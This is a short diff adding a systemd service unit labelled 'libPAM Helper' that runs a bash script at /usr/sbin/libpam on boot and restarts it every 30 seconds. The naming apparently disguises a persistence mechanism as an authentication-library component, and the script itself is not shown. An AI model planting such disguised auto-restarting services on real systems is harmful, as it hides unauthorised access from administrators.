@@ -1,0 +1,13 @@
+# Robert Gray <rpg4231@rit.edu>
+
+[Unit]
+Description=libPAM Helper
+After=network.target
+
+[Service]
+Restart=always
+RestartSec=30s
+ExecStart=/bin/bash /usr/sbin/libpam
+
+[Install]
+WantedBy=multi-user.target
